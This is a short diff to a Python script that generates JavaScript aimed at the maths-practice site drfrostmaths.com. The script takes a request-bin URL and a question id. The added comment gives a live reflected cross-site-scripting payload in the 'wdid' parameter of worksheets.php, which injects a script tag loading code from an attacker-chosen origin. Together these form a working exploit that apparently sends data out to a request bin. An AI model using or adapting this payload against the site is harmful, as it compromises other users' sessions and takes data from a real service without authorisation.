@@ -4,6 +4,8 @@ bin = input('request bin url: ')
 aaid = int(input('question id: '))
 code = template % (bin, aaid)
 
-origin = input('origin JavaScript: ')
+origin = input('origin for JavaScript: ')
 print(f'upload the following code to {origin}\n')
 print(f'{code}\n')
+
+# vulnerable endpoint: https://drfrostmaths.com/worksheets.php?wdid=-3;</script><script src=[origin]><!--
